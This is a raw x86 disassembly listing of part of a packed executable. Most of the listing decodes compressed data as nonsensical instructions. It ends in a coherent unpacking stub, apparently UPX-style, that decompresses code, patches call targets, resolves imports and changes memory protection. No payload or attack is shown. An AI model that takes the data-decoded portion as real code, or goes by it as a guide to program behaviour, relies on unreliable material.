  430bcf:	sbb    edx,DWORD PTR ds:0x520050a
  430bd5:	and    dl,BYTE PTR [esp+ecx*1]
  430bd8:	sbb    DWORD PTR [edx+0x9],ecx
  430bdb:	(bad)  
  430bdd:	(bad)  
  430bde:	inc    DWORD PTR ds:0x3bf00d23
  430be4:	add    DWORD PTR [eax+esi*8],ebx
  430be7:	inc    esi
  430be8:	add    esi,eax
  430bea:	rol    BYTE PTR [edx],cl
  430bec:	lock popa 
  430bee:	je     0x430be0
  430bf0:	pop    es
  430bf1:	add    ecx,DWORD PTR [esi]
  430bf3:	add    eax,0x2ff01084
  430bf8:	cld    
  430bf9:	(bad)  
  430bfa:	(bad)  
  430bfb:	fild   WORD PTR [ecx]
  430bfd:	push   ds
  430bfe:	push   ds
  430bff:	sbb    cl,BYTE PTR [esi+0x22]
  430c02:	lock lods eax,DWORD PTR ds:[esi]
  430c04:	add    DWORD PTR [edx],ecx
  430c06:	adc    al,0x18
  430c08:	pop    es
  430c09:	imul   edx,DWORD PTR [ecx],0x1e140740
  430c0f:	or     DWORD PTR [ecx+eax*2],ecx
  430c12:	xor    al,0x3
  430c14:	sbb    DWORD PTR [edx+0x29fed6fb],0x7b
  430c1b:	sub    DWORD PTR [edi],esp
  430c1d:	or     BYTE PTR [ecx+0x22],0xc
  430c21:	dec    edi
  430c22:	pop    ss
  430c23:	adc    DWORD PTR ds:0x7bc36407,ecx
  430c29:	sti    
  430c2a:	cld    
  430c2b:	pop    ss
  430c2c:	mov    WORD PTR [ecx],cs
  430c2e:	or     DWORD PTR [edx+ecx*1],ecx
  430c31:	daa    
  430c32:	adc    eax,0x2a280a11
  430c37:	inc    ebx
  430c38:	sbb    DWORD PTR [eax],edx
  430c3a:	adc    DWORD PTR [eax+0x6d6c2eeb],edi
  430c40:	add    eax,0xbb17257e
  430c45:	adc    cl,BYTE PTR ds:0x84000803
  430c4b:	mov    ch,0x37
  430c4d:	sub    al,BYTE PTR [ebp+ecx*8+0x0]
  430c51:	xchg   ebx,eax
  430c52:	push   ecx
  430c53:	js     0x430c9c
  430c55:	minps  xmm1,XMMWORD PTR [edi+0x5e]
  430c59:	push   cs
  430c5a:	enter  0x3604,0xd9
  430c5e:	adc    ah,BYTE PTR [eax]
  430c60:	or     edx,DWORD PTR [edx+ecx*1]
  430c63:	adc    BYTE PTR [ebp+ebx*1+0x20181365],al
  430c6a:	adc    BYTE PTR [edi+eax*2-0x27],cl
  430c6e:	sub    cl,BYTE PTR [ebx]
  430c70:	inc    ecx
  430c71:	or     bl,BYTE PTR [eax]
  430c73:	pop    ecx
  430c74:	sub    BYTE PTR [ebx+0x65],bl
  430c77:	js     0x430caf
  430c79:	cld    
  430c7a:	xchg   edi,eax
  430c7b:	ins    DWORD PTR es:[edi],dx
  430c7c:	test   DWORD PTR [ebx+0x18],edx
  430c7f:	or     eax,0x101b023c
  430c84:	pop    eax
  430c85:	sbb    al,BYTE PTR [ebx]
  430c87:	shl    BYTE PTR [eax+0x17],cl
  430c8a:	or     al,0xad
  430c8c:	pop    eax
  430c8d:	(bad)  
  430c8e:	(bad)  
  430c90:	pop    ebx
  430c91:	fidiv  DWORD PTR [ebx]
  430c93:	or     ebx,DWORD PTR [eax+0xa]
  430c96:	add    al,0x89
  430c98:	adc    ecx,DWORD PTR [edx*1+0x4617114f]
  430c9f:	std    
  430ca0:	and    edi,ebx
  430ca2:	dec    DWORD PTR [eax]
  430ca4:	lock dec ebp
  430ca6:	add    eax,esi
  430ca8:	les    eax,FWORD PTR [edx]
  430caa:	adc    eax,0x16ff00b
  430caf:	add    al,0x0
  430cb1:	int3   
  430cb2:	pop    es
  430cb3:	ret    0x9ff0
  430cb6:	add    edi,edi
  430cb8:	fstp   st(7)
  430cba:	and    eax,ecx
  430cbc:	gs das 
  430cbe:	sbb    edx,DWORD PTR [ecx]
  430cc0:	lock cmp eax,0xf0150201
  430cc6:	or     eax,DWORD PTR [ecx]
  430cc8:	(bad)  
  430cc9:	adc    ch,BYTE PTR [eax-0x9bd10]
  430ccf:	(bad)  
  430cd1:	add    DWORD PTR [edx],ebx
  430cd3:	or     ah,BYTE PTR [esi-0x28]
  430cd6:	lock lods al,BYTE PTR ds:[esi]
  430cd8:	adc    edi,DWORD PTR [eax]
  430cda:	add    ebx,ebp
  430cdc:	ss push ecx
  430cde:	sub    eax,0xf3b4b67
  430ce3:	outs   dx,DWORD PTR ds:[esi]
  430ce4:	push   edx
  430ce5:	push   ebx
  430ce6:	outs   dx,BYTE PTR ds:[esi]
  430ce7:	pop    es
  430ce8:	cmp    eax,0xfffedf48
  430ced:	inc    ebx
  430cee:	jmp    0x146a6b0d
  430cf3:	adc    al,0x38
  430cf5:	dec    ebx
  430cf6:	push   ss
  430cf7:	push   ss
  430cf8:	out    0x14,eax
  430cfa:	dec    esi
  430cfb:	aas    
  430cfc:	aas    
  430cfd:	and    DWORD PTR [eax+0x34],edi
  430d00:	adc    esi,DWORD PTR [esi*1-0x168fd1fb]
  430d07:	das    
  430d08:	adc    al,0x11
  430d0a:	push   esp
  430d0b:	or     al,0x24
  430d0d:	xor    al,0xf0
  430d0f:	adc    DWORD PTR [edx+0x6f],eax
  430d12:	(bad)  
  430d13:	fucomip st,st(0)
  430d15:	mov    edx,0x21490544
  430d1a:	adc    ecx,DWORD PTR [eax]
  430d1c:	aas    
  430d1d:	add    eax,0xb12f230e
  430d22:	sbb    al,0x47
  430d24:	push   ss
  430d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430d26:	adc    cl,BYTE PTR [ebx+0x18]
  430d29:	fidiv  DWORD PTR [esi-0x1]
  430d2c:	dec    ebx
  430d2d:	mov    esp,0x1712522c
  430d32:	adc    dl,BYTE PTR [ebp+ebp*1+0x2d]
  430d36:	xor    DWORD PTR [esi],eax
  430d38:	lock sbb ch,BYTE PTR [ecx+0x3c]
  430d3c:	(bad)  
  430d3d:	(bad)  
  430d3e:	call   FWORD PTR [edi-0x6e]
  430d41:	add    eax,0x52d230c
  430d46:	sbb    ah,BYTE PTR ds:0x260a3a32
  430d4c:	sbb    al,0x1f
  430d4e:	adc    ch,BYTE PTR [edx]
  430d50:	adc    al,0x31
  430d52:	bndldx bnd2,[edx]
  430d55:	cmp    esp,DWORD PTR [eax]
  430d57:	sub    BYTE PTR [edx+0x35],ch
  430d5a:	sbb    DWORD PTR ds:0x37d6ff19,ecx
  430d60:	std    
  430d61:	nop    DWORD PTR [ebx]
  430d64:	cmp    dl,dl
  430d66:	inc    eax
  430d67:	jle    0x430d7d
  430d69:	or     DWORD PTR [eax-0x6ae9b5f6],edi
  430d6f:	das    
  430d70:	(bad)  
  430d71:	cmp    al,BYTE PTR [esi+0x17]
  430d74:	and    bh,bh
  430d76:	(bad)  
  430d77:	jmp    DWORD PTR [ebp+0x1307940e]
  430d7d:	sbb    BYTE PTR [edi],bl
  430d7f:	or     BYTE PTR [esi],cl
  430d81:	inc    edx
  430d82:	push   ds
  430d83:	sub    ecx,DWORD PTR [edi]
  430d85:	adc    al,0x53
  430d87:	pop    es
  430d88:	mov    eax,ds:0xc20f1a31
  430d8d:	adc    cl,BYTE PTR [ebp+0x12]
  430d90:	adc    al,0x4c
  430d92:	sub    al,0xec
  430d94:	fist   DWORD PTR [ebp-0x6]
  430d97:	xor    eax,0x301c0f0f
  430d9c:	and    al,0x6
  430d9e:	add    eax,0x5070106
  430da3:	pop    edx
  430da4:	outs   dx,BYTE PTR ds:[esi]
  430da5:	test   eax,0x6509715
  430daa:	add    ecx,DWORD PTR [eax-0x1]
  430dad:	mov    ebx,0x2800fb7e
  430db2:	add    al,BYTE PTR [esi]
  430db4:	adc    DWORD PTR [ebx],ecx
  430db6:	add    eax,0x2a20d01d
  430dbb:	sbb    bl,BYTE PTR [esi]
  430dbd:	pop    ecx
  430dbe:	push   ds
  430dbf:	push   ebp
  430dc0:	xor    al,0x4c
  430dc2:	push   0xffe05e95
  430dc7:	cmp    eax,0x1426143c
  430dcc:	push   0x36
  430dce:	inc    ebx
  430dcf:	cmp    eax,0x2c64a5f0
  430dd4:	cs and al,0xd2
  430dd7:	jmp    0x430e38
  430dd9:	sub    ch,BYTE PTR [ecx+edx*4]
  430ddc:	adc    cl,BYTE PTR [edx+0x74]
  430ddf:	or     eax,0x5120716
  430de4:	adc    BYTE PTR [edx],cl
  430de6:	(bad)  
  430de8:	ja     0x430e59
  430dea:	jg     0x430e09
  430dec:	adc    cl,BYTE PTR [edx+0x16]
  430def:	sub    DWORD PTR [esi],ecx
  430df1:	xchg   BYTE PTR [ebx],bl
  430df3:	adc    edx,DWORD PTR [ebx]
  430df5:	add    ecx,DWORD PTR [ecx]
  430df7:	pop    ds
  430df8:	push   cs
  430df9:	pop    ds
  430dfa:	sbb    BYTE PTR [ecx],cl
  430dfc:	adc    al,0xe
  430dfe:	std    
  430dff:	pop    ebx
  430e00:	lods   eax,DWORD PTR ds:[esi]
  430e01:	pop    ebp
  430e02:	leave  
  430e03:	and    cl,BYTE PTR [edi]
  430e05:	in     eax,0x3
  430e07:	test   al,0x15
  430e09:	or     BYTE PTR ds:0x3816c10d,bl
  430e0f:	mov    bh,0xde
  430e11:	or     dh,BYTE PTR [edi-0x36]
  430e14:	push   ds
  430e15:	sub    eax,0x56f982a
  430e1a:	lock sbb al,0x8
  430e1d:	pushf  
  430e1e:	add    al,BYTE PTR [eax+0x26]
  430e21:	enter  0x3a0e,0x1
  430e25:	or     BYTE PTR [ecx+edi*8+0xc0fa1fc],ah
  430e2c:	or     edx,DWORD PTR [ebx+ecx*1]
  430e2f:	or     cl,BYTE PTR [edx]
  430e31:	push   es
  430e32:	or     ebp,DWORD PTR [ebx]
  430e34:	push   eax
  430e35:	dec    eax
  430e36:	xchg   esi,eax
  430e37:	add    BYTE PTR [edi+0x1f600f3b],dl
  430e3d:	lods   al,BYTE PTR ds:[esi]
  430e3e:	pop    ebx
  430e3f:	mov    eax,0x64622426
  430e44:	ss or  eax,0x756b0229
  430e4a:	mov    bh,0x3f
  430e4c:	das    
  430e4d:	sbb    dh,BYTE PTR ss:0x4201323e
  430e54:	pop    ds
  430e55:	sbb    esi,DWORD PTR [edi]
  430e57:	xchg   edi,eax
  430e58:	in     al,0x47
  430e5a:	test   DWORD PTR [ebp+0x59],0x122f002
  430e61:	push   0xbd20dd30
  430e66:	ror    BYTE PTR [esi+0xe],0x0
  430e6a:	sbb    BYTE PTR [eax],bl
  430e6c:	sub    al,BYTE PTR [edx+esi*1]
  430e6f:	push   ebp
  430e70:	jbe    0x430e8e
  430e72:	or     ah,BYTE PTR [eax]
  430e74:	ins    BYTE PTR es:[edi],dx
  430e75:	sti    
  430e76:	inc    edi
  430e77:	fstp   DWORD PTR [edx*1+0x170f0e25]
  430e7e:	xor    bh,BYTE PTR [ebx+eax*1]
  430e81:	sub    BYTE PTR [edi],al
  430e83:	test   cl,0xda
  430e86:	pop    es
  430e87:	sub    eax,0x5210f87
  430e8c:	add    DWORD PTR [edi+ecx*1],edx
  430e8f:	adc    DWORD PTR [edx],esi
  430e91:	sbb    bh,bh
  430e93:	inc    DWORD PTR [ebp+0x5bf077cd]
  430e99:	stc    
  430e9a:	das    
  430e9b:	add    ecx,DWORD PTR [esi]
  430e9d:	lahf   
  430e9e:	cmp    BYTE PTR [edi],ch
  430ea0:	sbb    edx,DWORD PTR [esi]
  430ea2:	pusha  
  430ea3:	cmp    BYTE PTR [edi],dl
  430ea5:	sbb    DWORD PTR [eax+0x1d],ecx
  430ea8:	cmp    BYTE PTR [ecx],bl
  430eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430eab:	push   edx
  430eac:	add    bh,cl
  430eae:	pop    ss
  430eaf:	push   ebx
  430eb0:	xor    BYTE PTR [esi],dh
  430eb2:	sbb    al,0x19
  430eb4:	test   ch,ah
  430eb6:	in     eax,dx
  430eb7:	pop    ss
  430eb8:	sbb    BYTE PTR [esi],ah
  430eba:	lock aam 0x1
  430ebd:	push   0x3d
  430ebf:	cmp    ebx,DWORD PTR ds:0x15e42334
  430ec5:	idiv   BYTE PTR [ebx]
  430ec7:	sub    eax,DWORD PTR [ebx+0x1d]
  430eca:	aas    
  430ecb:	inc    BYTE PTR [ecx]
  430ecd:	inc    esi
  430ecf:	jg     0x430eb4
  430ed1:	lock sbb eax,DWORD PTR [edx]
  430ed4:	test   al,0x18
  430ed6:	outs   dx,DWORD PTR ds:[esi]
  430ed7:	pop    ss
  430ed8:	adc    edx,DWORD PTR [edx]
  430eda:	jle    0x430ef1
  430edc:	adc    eax,0x51a20cd
  430ee1:	shl    BYTE PTR [ecx+0xd],cl
  430ee4:	sbb    eax,ebx
  430ee6:	jecxz  0x430e8d
  430ee8:	inc    DWORD PTR [esi]
  430eea:	adc    al,0x5
  430eec:	loopne 0x430f13
  430eee:	or     eax,0x8116210b
  430ef3:	and    DWORD PTR [esp+ecx*1],ecx
  430ef6:	or     eax,0x7054ecfd
  430efb:	dec    ebp
  430efc:	adc    eax,0x34990005
  430f01:	add    DWORD PTR [eax],edi
  430f03:	adc    ch,BYTE PTR [eax]
  430f05:	adc    ebp,eax
  430f07:	fdivr  DWORD PTR [ecx]
  430f09:	test   BYTE PTR ds:0xbad3b83,dl
  430f0f:	adc    dl,BYTE PTR [ecx]
  430f11:	inc    ecx
  430f12:	out    dx,eax
  430f13:	sbb    DWORD PTR [eax+edx*4+0xd],0x15180a10
  430f1b:	sbb    BYTE PTR [eax+0x100c2f2f],dl
  430f21:	push   ds
  430f22:	mov    ch,0xf6
  430f24:	in     eax,dx
  430f25:	sbb    DWORD PTR [ebx],0x49f040a
  430f2b:	adc    edx,DWORD PTR ds:0xb7bd1523
  430f31:	or     eax,0xa36e2046
  430f36:	push   cs
  430f37:	xor    eax,0x60b90b19
  430f3c:	sub    esi,DWORD PTR [eax+0x697b3110]
  430f42:	push   esi
  430f43:	ret    0x96ca
  430f46:	mov    DWORD PTR [ebx+0x1ac09a09],ebx
  430f4c:	ret    
  430f4d:	cmp    dl,dh
  430f4f:	icebp  
  430f50:	test   DWORD PTR ss:[edi+0x3fc5d1b8],esi
  430f57:	add    DWORD PTR [edi],edx
  430f59:	pop    ds
  430f5a:	add    al,BYTE PTR [ecx]
  430f5c:	or     eax,0x18b7c062
  430f61:	mov    al,0x5
  430f63:	cmp    BYTE PTR [eax-0x6c],bl
  430f66:	adc    al,BYTE PTR [ecx]
  430f68:	jbe    0x430f8d
  430f6a:	(bad)  
  430f6b:	(bad)  
  430f6c:	(bad)  
  430f6d:	mov    edi,0x3da02a22
  430f72:	test   DWORD PTR [edx+0x2c],ecx
  430f75:	dec    ecx
  430f76:	cmp    eax,0x7e20431c
  430f7b:	das    
  430f7c:	inc    esp
  430f7d:	pop    es
  430f7e:	pop    ss
  430f7f:	dec    esp
  430f80:	push   esp
  430f81:	sbb    edi,DWORD PTR [esi+edx*1+0x192d1d4f]
  430f88:	dec    ebx
  430f89:	pop    eax
  430f8a:	dec    edi
  430f8b:	or     edi,edi
  430f8d:	(bad)  
  430f8e:	(bad)  
  430f8f:	dec    DWORD PTR [esi]
  430f91:	push   edx
  430f92:	push   0x3929264d
  430f97:	push   ss
  430f98:	ja     0x430fb7
  430f9a:	cmp    ch,BYTE PTR [edx+edi*1]
  430f9d:	sbb    eax,eax
  430f9f:	inc    esi
  430fa0:	push   esp
  430fa1:	cmp    eax,0x1d129b8d
  430fa6:	das    
  430fa7:	push   ss
  430fa8:	inc    edi
  430fa9:	sbb    eax,0x1d441a35
  430fae:	imul   ebx,DWORD PTR [esi],0xedf6cbff
  430fb4:	aas    
  430fb5:	and    eax,0x31290e28
  430fba:	arpl   WORD PTR [edi],sp
  430fbc:	adc    bl,BYTE PTR [edi+0x51]
  430fbf:	nop
  430fc0:	ins    DWORD PTR es:[edi],dx
  430fc1:	jge    0x430ff9
  430fc3:	pop    ds
  430fc4:	push   eax
  430fc5:	sbb    al,ah
  430fc7:	dec    BYTE PTR [ebp-0x54c600e6]
  430fcd:	sbb    BYTE PTR [ecx+0x9f04718],dh
  430fd3:	xor    DWORD PTR [ebx],edi
  430fd5:	pop    es
  430fd6:	push   ecx
  430fd7:	pop    es
  430fd8:	push   esp
  430fd9:	js     0x430fe2
  430fdb:	push   ebx
  430fdc:	mov    edi,0x82dfb7f0
  430fe1:	dec    esp
  430fe2:	add    DWORD PTR [ebx+0x7],esp
  430fe5:	pop    esi
  430fe6:	pop    edi
  430fe7:	or     BYTE PTR [edi+ecx*1],0x60
  430feb:	add    eax,0x545fd27
  430ff0:	pop    ds
  430ff1:	adc    DWORD PTR [esi+edx*8+0x7ff8c0b],edi
  430ff8:	jns    0x430f85
  430ffa:	das    
  430ffb:	scas   eax,DWORD PTR es:[edi]
  430ffc:	inc    edx
  430ffd:	and    ebx,edi
  430fff:	and    DWORD PTR [edx-0x5],esi
  431002:	add    BYTE PTR [esi],bh
  431004:	rol    BYTE PTR [esi-0x7d],cl
  431007:	div    al
  431009:	jnp    0x43100c
  43100b:	pusha  
  43100c:	popf   
  43100d:	or     dl,BYTE PTR gs:[ebx]
  431010:	in     eax,dx
  431011:	fidiv  DWORD PTR [ecx+0x1efc30c0]
  431017:	xor    DWORD PTR [eax],ebx
  431019:	sbb    ah,BYTE PTR [eax+0xf]
  43101c:	or     ch,ah
  43101e:	ss ss or al,0xc2
  431022:	cmp    BYTE PTR [ebx],dl
  431024:	jno    0x43102d
  431026:	add    DWORD PTR ds:0xd2038510,ecx
  43102c:	pop    eax
  43102d:	daa    
  43102e:	sbb    BYTE PTR [ebp-0x10],ah
  431031:	jecxz  0x43103c
  431033:	pop    edi
  431034:	add    BYTE PTR [eax+0x1e50c306],ch
  43103a:	or     eax,0xfdb6118a
  43103f:	jg     0x430fe2
  431041:	je     0x43109f
  431043:	dec    edi
  431044:	or     eax,0x3e05361e
  431049:	or     eax,0xd290597
  43104e:	and    al,BYTE PTR [edx]
  431050:	sub    BYTE PTR [ebx-0x7e890001],al
  431056:	mov    cs,WORD PTR [eax+0x11]
  431059:	mov    WORD PTR [edi],cs
  43105b:	jp     0x431079
  43105d:	pop    es
  43105e:	mov    esi,es
  431060:	mov    bl,0x32
  431062:	adc    BYTE PTR [edi],dh
  431064:	sbb    esp,DWORD PTR [esi]
  431066:	add    eax,0x37d95439
  43106b:	push   ss
  43106c:	clc    
  43106d:	adc    ch,BYTE PTR [ecx*1+0x5fc1e0f]
  431074:	int3   
  431075:	or     ecx,DWORD PTR [edi]
  431077:	push   es
  431078:	sbb    DWORD PTR [ebp-0x1b],ecx
  43107b:	fisubr WORD PTR [ebx+0x7d]
  43107e:	mov    dl,0x1e
  431080:	inc    edi
  431081:	repz jne 0x431084
  431084:	or     BYTE PTR [edi-0x132e493f],ch
  43108a:	adc    bl,BYTE PTR [eax]
  43108c:	or     al,BYTE PTR [eax+0xc]
  43108f:	lods   eax,DWORD PTR ds:[esi]
  431090:	or     al,0x86
  431092:	out    dx,al
  431093:	push   ds
  431094:	arpl   WORD PTR [ebp-0xffc0cf9],ax
  43109a:	mov    ch,0x9
  43109c:	push   ss
  43109d:	imul   eax,DWORD PTR [ebx+0x9],0x6c
  4310a1:	and    BYTE PTR [edx*4-0x4dd2dced],dl
  4310a8:	mov    ecx,0x4315337
  4310ad:	adc    cl,BYTE PTR [ebx]
  4310af:	sub    edx,DWORD PTR [eax+0x40]
  4310b2:	or     esp,DWORD PTR [eax+0x6e]
  4310b5:	stc    
  4310b6:	mov    bh,0x7b
  4310b8:	sbb    al,0xf0
  4310ba:	or     al,0x6
  4310bc:	add    al,0x4
  4310be:	in     al,0x24
  4310c0:	add    DWORD PTR [eax],eax
  4310c2:	add    al,0xe
  4310c4:	nop
  4310c5:	pop    es
  4310c6:	cmp    al,0x8
  4310c8:	sub    BYTE PTR [edx],al
  4310ca:	add    eax,eax
  4310cc:	outs   dx,BYTE PTR ds:[esi]
  4310cd:	or     DWORD PTR [edx],eax
  4310cf:	cmp    BYTE PTR [eax],cl
  4310d1:	add    ch,bl
  4310d3:	cmp    eax,0x480c950
  4310d8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4310da:	aaa    
  4310db:	add    eax,0xb455000
  4310e0:	add    eax,0x568c5a34
  4310e5:	inc    ebx
  4310e6:	pop    esi
  4310e7:	mov    bh,0xf8
  4310e9:	pusha  
  4310ea:	lds    eax,FWORD PTR [edx+0x2a]
  4310ed:	in     al,dx
  4310ee:	loopne 0x4310f0
  4310f0:	mov    es,WORD PTR [ecx+0x37190287]
  4310f6:	and    bh,dl
  4310f8:	aad    0x0
  4310fa:	cmp    al,0xe8
  4310fc:	pop    eax
  4310fd:	add    esp,ecx
  4310ff:	or     BYTE PTR [ecx-0x76],cl
  431102:	into   
  431103:	mov    esi,0xf500191
  431108:	inc    eax
  431109:	or     eax,DWORD PTR [edx]
  43110b:	fld    DWORD PTR [edx+0x7f42325]
  431111:	adc    al,0xf0
  431113:	outs   dx,DWORD PTR ds:[esi]
  431114:	test   dh,0x2e
  431117:	add    al,BYTE PTR ds:0x33072e10
  43111d:	je     0x4310d6
  43111f:	retf   
  431120:	or     WORD PTR [eax],ax
  431123:	jo     0x431174
  431125:	mov    BYTE PTR [edi+eax*1],cl
  431128:	shl    BYTE PTR [edi-0x7f4f95fc],0x80
  43112f:	shl    BYTE PTR [eax+0x2bf21501],1
  431135:	in     al,0x0
  431137:	cld    
  431138:	sbb    BYTE PTR [eax-0x4e7ffff],dl
  43113e:	cmp    ah,0x7e
  431141:	inc    ebx
  431142:	dec    edi
  431143:	inc    esp
  431144:	inc    ebp
  431145:	xlat   BYTE PTR ds:[ebx]
  431146:	test   al,0x3a
  431148:	jmp    0x43114e
  43114a:	and    ebx,eax
  43114c:	out    0xb7,eax
  43114e:	or     esp,DWORD PTR [eax]
  431150:	or     esp,DWORD PTR [eax+0x44]
  431153:	inc    ecx
  431154:	push   esp
  431155:	inc    ecx
  431156:	pusha  
  431157:	or     bl,bh
  431159:	jge    0x431112
  43115b:	mov    al,0x37
  43115d:	or     bh,dh
  43115f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431160:	faddp  st(0),st
  431162:	inc    edx
  431163:	push   ebx
  431164:	push   ebx
  431165:	add    BYTE PTR [ebx+0x36],dl
  431168:	fdiv   st,st(3)
  43116a:	daa    
  43116b:	in     eax,0x60
  43116d:	pop    ds
  43116e:	dec    edx
  43116f:	iret   
  431170:	shr    BYTE PTR [ebx],0xe9
  431173:	into   
  431174:	(bad)  
  431175:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x70f30061
  43117e:	daa    
  43117f:	push   cs
  431180:	(bad)  
  431181:	cmp    al,0x41
  431183:	lahf   
  431184:	inc    eax
  431185:	je     0x4311f3
  431187:	stos   BYTE PTR es:[edi],al
  431188:	or     al,0x80
  43118a:	dec    edi
  43118b:	ja     0x4311bf
  43118d:	or     BYTE PTR [eax+ebx*2],0x72
  431191:	sbb    BYTE PTR [edi],ah
  431193:	mov    dh,0x6e
  431195:	and    eax,0x4f0290cd
  43119a:	push   eax
  43119b:	daa    
  43119c:	gs dec ebp
  43119e:	ja     0x431122
  4311a0:	sub    DWORD PTR [esi+0x1a27a04b],edx
  4311a6:	pop    edx
  4311a7:	popf   
  4311a8:	loopne 0x4311c8
  4311aa:	and    BYTE PTR [ebx+0x72],dh
  4311ad:	es mov eax,eax
  4311b0:	and    BYTE PTR [eax+0x59],bl
  4311b3:	rol    DWORD PTR [ebx],cl
  4311b5:	and    al,0x74
  4311b7:	daa    
  4311b8:	loopne 0x431189
  4311ba:	(bad)  [esi+0x17734839]
  4311c0:	push   eax
  4311c1:	call   0x337eac8
  4311c6:	add    BYTE PTR [eax],al
  4311c8:	add    BYTE PTR [eax],al
  4311ca:	add    BYTE PTR [eax],al
  4311cc:	add    BYTE PTR [eax-0x419f0100],dl
  4311d2:	add    BYTE PTR [eax-0x4172ffbf],al
  4311d8:	add    BYTE PTR [eax-0x7ca80002],dl
  4311de:	int    0xff
  4311e0:	jmp    0x4311f2
  4311e2:	nop
  4311e3:	nop
  4311e4:	nop
  4311e5:	nop
  4311e6:	nop
  4311e7:	nop
  4311e8:	mov    al,BYTE PTR [esi]
  4311ea:	inc    esi
  4311eb:	mov    BYTE PTR [edi],al
  4311ed:	inc    edi
  4311ee:	add    ebx,ebx
  4311f0:	jne    0x4311f9
  4311f2:	mov    ebx,DWORD PTR [esi]
  4311f4:	sub    esi,0xfffffffc
  4311f7:	adc    ebx,ebx
  4311f9:	jb     0x4311e8
  4311fb:	mov    eax,0x1
  431200:	add    ebx,ebx
  431202:	jne    0x43120b
  431204:	mov    ebx,DWORD PTR [esi]
  431206:	sub    esi,0xfffffffc
  431209:	adc    ebx,ebx
  43120b:	adc    eax,eax
  43120d:	add    ebx,ebx
  43120f:	jae    0x431200
  431211:	jne    0x43121c
  431213:	mov    ebx,DWORD PTR [esi]
  431215:	sub    esi,0xfffffffc
  431218:	adc    ebx,ebx
  43121a:	jae    0x431200
  43121c:	xor    ecx,ecx
  43121e:	sub    eax,0x3
  431221:	jb     0x431230
  431223:	shl    eax,0x8
  431226:	mov    al,BYTE PTR [esi]
  431228:	inc    esi
  431229:	xor    eax,0xffffffff
  43122c:	je     0x4312a2
  43122e:	mov    ebp,eax
  431230:	add    ebx,ebx
  431232:	jne    0x43123b
  431234:	mov    ebx,DWORD PTR [esi]
  431236:	sub    esi,0xfffffffc
  431239:	adc    ebx,ebx
  43123b:	adc    ecx,ecx
  43123d:	add    ebx,ebx
  43123f:	jne    0x431248
  431241:	mov    ebx,DWORD PTR [esi]
  431243:	sub    esi,0xfffffffc
  431246:	adc    ebx,ebx
  431248:	adc    ecx,ecx
  43124a:	jne    0x43126c
  43124c:	inc    ecx
  43124d:	add    ebx,ebx
  43124f:	jne    0x431258
  431251:	mov    ebx,DWORD PTR [esi]
  431253:	sub    esi,0xfffffffc
  431256:	adc    ebx,ebx
  431258:	adc    ecx,ecx
  43125a:	add    ebx,ebx
  43125c:	jae    0x43124d
  43125e:	jne    0x431269
  431260:	mov    ebx,DWORD PTR [esi]
  431262:	sub    esi,0xfffffffc
  431265:	adc    ebx,ebx
  431267:	jae    0x43124d
  431269:	add    ecx,0x2
  43126c:	cmp    ebp,0xfffff300
  431272:	adc    ecx,0x1
  431275:	lea    edx,[edi+ebp*1]
  431278:	cmp    ebp,0xfffffffc
  43127b:	jbe    0x43128c
  43127d:	mov    al,BYTE PTR [edx]
  43127f:	inc    edx
  431280:	mov    BYTE PTR [edi],al
  431282:	inc    edi
  431283:	dec    ecx
  431284:	jne    0x43127d
  431286:	jmp    0x4311ee
  43128b:	nop
  43128c:	mov    eax,DWORD PTR [edx]
  43128e:	add    edx,0x4
  431291:	mov    DWORD PTR [edi],eax
  431293:	add    edi,0x4
  431296:	sub    ecx,0x4
  431299:	ja     0x43128c
  43129b:	add    edi,ecx
  43129d:	jmp    0x4311ee
  4312a2:	pop    esi
  4312a3:	mov    edi,esi
  4312a5:	mov    ecx,0x996
  4312aa:	mov    al,BYTE PTR [edi]
  4312ac:	inc    edi
  4312ad:	sub    al,0xe8
  4312af:	cmp    al,0x1
  4312b1:	ja     0x4312aa
  4312b3:	cmp    BYTE PTR [edi],0x1
  4312b6:	jne    0x4312aa
  4312b8:	mov    eax,DWORD PTR [edi]
  4312ba:	mov    bl,BYTE PTR [edi+0x4]
  4312bd:	shr    ax,0x8
  4312c1:	rol    eax,0x10
  4312c4:	xchg   ah,al
  4312c6:	sub    eax,edi
  4312c8:	sub    bl,0xe8
  4312cb:	add    eax,esi
  4312cd:	mov    DWORD PTR [edi],eax
  4312cf:	add    edi,0x5
  4312d2:	mov    al,bl
  4312d4:	loop   0x4312af
  4312d6:	lea    edi,[esi+0x2e000]
  4312dc:	mov    eax,DWORD PTR [edi]
  4312de:	or     eax,eax
  4312e0:	je     0x43131e
  4312e2:	mov    ebx,DWORD PTR [edi+0x4]
  4312e5:	lea    eax,[eax+esi*1+0x31eac]
  4312ec:	add    ebx,esi
  4312ee:	push   eax
  4312ef:	add    edi,0x8
  4312f2:	call   DWORD PTR [esi+0x31f4c]
  4312f8:	xchg   ebp,eax
  4312f9:	mov    al,BYTE PTR [edi]
  4312fb:	inc    edi
  4312fc:	or     al,al
  4312fe:	je     0x4312dc
  431300:	mov    ecx,edi
  431302:	push   edi
  431303:	dec    eax
  431304:	repnz scas al,BYTE PTR es:[edi]
  431306:	push   ebp
  431307:	call   DWORD PTR [esi+0x31f50]
  43130d:	or     eax,eax
  43130f:	je     0x431318
  431311:	mov    DWORD PTR [ebx],eax
  431313:	add    ebx,0x4
  431316:	jmp    0x4312f9
  431318:	call   DWORD PTR [esi+0x31f60]
  43131e:	add    edi,0x4
  431321:	lea    ebx,[esi-0x4]
  431324:	xor    eax,eax
  431326:	mov    al,BYTE PTR [edi]
  431328:	inc    edi
  431329:	or     eax,eax
  43132b:	je     0x43134f
  43132d:	cmp    al,0xef
  43132f:	ja     0x431342
  431331:	add    ebx,eax
  431333:	mov    eax,DWORD PTR [ebx]
  431335:	xchg   ah,al
  431337:	rol    eax,0x10
  43133a:	xchg   ah,al
  43133c:	add    eax,esi
  43133e:	mov    DWORD PTR [ebx],eax
  431340:	jmp    0x431324
  431342:	and    al,0xf
  431344:	shl    eax,0x10
  431347:	mov    ax,WORD PTR [edi]
  43134a:	add    edi,0x2
  43134d:	jmp    0x431331
  43134f:	mov    ebp,DWORD PTR [esi+0x31f54]
  431355:	lea    edi,[esi-0x1000]
  43135b:	mov    ebx,0x1000
  431360:	push   eax
  431361:	push   esp
  431362:	push   0x4
  431364:	push   ebx
  431365:	push   edi
  431366:	call   ebp
  431368:	lea    eax,[edi+0x21f]
